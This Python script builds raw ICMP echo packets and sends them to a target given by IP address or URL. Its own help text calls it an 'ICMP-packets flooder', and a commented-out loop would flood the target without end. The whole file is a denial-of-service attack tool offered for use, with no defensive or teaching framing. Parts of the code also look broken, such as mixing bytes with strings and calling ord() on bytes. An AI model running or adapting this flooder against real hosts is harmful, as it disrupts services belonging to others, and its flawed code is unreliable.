import sys
import os
import time
import threading
import string
import struct
import socket
import random
import argparse

class Flooder():
    # Check data, calculated from the ICMP header and data
    def checksum(self, msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = ord(msg[i]) + (ord(msg[i+1]) << 8)
            s = ((s + w) & 0xffff) + ((s + w) >> 16)
        return socket.htons(~s & 0xffff)

    # Construct the header and data of packet and pack it
    def construct_packet(self, length, freq):
        header = struct.pack("bbHHh", 8, 0, 0, 1, 1)
        data = struct.pack("d", freq) + ((length - 50) * 'Q')
        header = struct.pack("bbHHh", 8, 0, socket.htons(self.checksum(header + data)), 1, 1)
        return header + data

    # Create socket to send packets to specified ip address
    # Close the created socket after using
    def create_socket(self, ip, port, length, freq):  
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        
        for i in range(0, 6):
            packet = self.construct_packet(length, freq)
            sock.sendto(packet, (ip, port))
            time.sleep(freq * 10)

        # This loop is for sending packet to target infinitely
        #while(True):
        #    packet = construct_packet(int(args.l), float(args.f))
        #    sock.sendto(packet, (ip_addr, int(args.p)))
        #    sock.settimeout(float(args.f))
        
        sock.close()
        
    def main(self, argv):
        parser = argparse.ArgumentParser(description="ICMP-packets flooder")
        parser.add_argument('-i', help='Enter ip address of destination')
        parser.add_argument('-u', help='Enter url address')
        parser.add_argument('-p', help='Specify port', default=69)
        parser.add_argument('-l', help='Specify packet length', default=60)
        parser.add_argument('-f', help='Specify value of frequence to sent packet', default=0.1)
        args = parser.parse_args()

        # Try to get ip address of destination (by url too)
        try:
            if args.u:
                url = args.u
                ip_addr = socket.gethostbyname(url)
                print("Specific Url: ", url)
            if args.i:
                ip_addr = args.i
                print("Specific IP-Address: ", ip_addr)
        except SystemError:
            print("Enter Url or IP-address")
        
        # Try to get port number to send packet      
        try:
            if int(args.p) > 0 and int(args.p) < 65530:
                print("Specific port: ", int(args.p))
            elif int(args.p) == 69:
                print("Default port: ", int(args.p))
            else:
                print("No valid port number")
        except TypeError:
            print("No valid type for port number")
            
        # Check for correct value of lenhgth of packet
        try:
            if int(args.l) < 51:
                print("Is too few length")
            elif int(args.l) == 60:
                print("Default length: ", int(args.l))
            else:
                print("Specific length of packet: ", int(args.l))
        except TypeError:
            print("No valid length")

        # Check for correct value of frequency to send packets
        try:
            if float(args.f) == 0.1:
                print("Default times: ", float(args.f))
            else:
                print("Specific count: ", float(args.f))
        except TypeError:
            print("No valid count")
            
        self.create_socket(ip_addr, int(args.p), int(args.l), float(args.f))

if __name__ == "__main__":
    flood = Flooder()
    flood.main(sys.argv[1:])
